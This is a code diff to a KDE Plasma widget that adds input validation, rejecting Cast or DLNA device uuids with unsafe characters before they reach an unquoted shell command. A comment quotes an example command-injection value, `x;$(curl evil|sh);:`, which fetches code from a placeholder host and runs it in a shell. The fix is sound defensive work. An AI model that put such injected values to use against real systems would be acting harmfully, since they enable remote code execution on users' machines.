@@ -3472,6 +3472,17 @@ PlasmoidItem {
                     // Port: default 8009 only for an unparseable field — DLNA
                     // lines carry a legitimate 0 (they are driven via location)
                     // and `|| 8009` would silently rewrite it.
+                    // The uuid is the ONE device-supplied field that reaches
+                    // a shell SENTINEL (CAST_ADOPT), where it is not quoted —
+                    // a malicious LAN renderer with a UDN like
+                    // `x;$(curl evil|sh);:` would otherwise run commands the
+                    // first time it is cast to. A real Cast uuid / DLNA UDN
+                    // is only letters, digits and :._- ; anything else is an
+                    // attack, and the safe move is to not list the device.
+                    if (!/^[A-Za-z0-9:._-]+$/.test(p[2])) {
+                        console.warn("[ARP] cast: rejecting device with unsafe uuid");
+                        continue;
+                    }
                     var prt = parseInt(p[5], 10);
                     var dev = {
                         "kind": p[1], "uuid": p[2], "name": p[3], "host": p[4],
